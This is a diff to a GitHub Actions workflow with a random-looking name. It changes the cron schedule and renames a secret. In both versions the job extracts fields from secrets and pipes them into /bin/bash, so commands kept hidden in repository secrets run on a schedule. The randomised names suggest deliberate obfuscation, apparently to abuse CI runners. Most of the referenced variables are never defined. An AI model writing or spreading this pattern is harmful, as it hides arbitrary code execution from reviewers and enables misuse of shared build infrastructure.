@@ -3,7 +3,8 @@ name: qiemkk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 3/6 * * *'
+    - cron: '11 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +13,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: qiemkk
         env:
-          j3737: ${{ secrets.j3737 }}
+          vwhkl4593: ${{ secrets.vwhkl4593 }}
         run: |
-          echo $j3737 | jq -r .grr61 | /bin/bash
-          echo $gz4 | jq -r .evxdh59313 | /bin/bash
-          echo $f6 | jq -r .ip08504 | /bin/bash
-          echo $w0 | jq -r .yphpp459 | /bin/bash
-          echo $l866 | jq -r .slsm3 | /bin/bash
-          echo $m44 | jq -r .ge2994 | /bin/bash
-          echo $l2181 | jq -r .jn03 | /bin/bash
-          echo $ddlax0045 | jq -r .i7058 | /bin/bash
-          echo $qjek1 | jq -r .mgfa31122 | /bin/bash
-          echo $hv8 | jq -r .nopk9 | /bin/bash
+          echo $vwhkl4593 | jq -r .jobez34 | /bin/bash
+          echo $sswhp154 | jq -r .t6 | /bin/bash
+          echo $gja31632 | jq -r .ry80608 | /bin/bash
+          echo $dsuwb09 | jq -r .llx90513 | /bin/bash
+          echo $p09 | jq -r .gxva62172 | /bin/bash
+          echo $wcve00 | jq -r .ys37 | /bin/bash
+          echo $oqdex6130 | jq -r .op7322 | /bin/bash
+          echo $hkcrb84314 | jq -r .vzzg2416 | /bin/bash
+          echo $yt73303 | jq -r .yvrc78608 | /bin/bash
+          echo $hrwwt332 | jq -r .i44 | /bin/bash
+          echo $fr34338 | jq -r .wc0 | /bin/bash
+          echo $jprvy85920 | jq -r .vtt15 | /bin/bash
+          echo $j66798 | jq -r .kqfh907 | /bin/bash
 
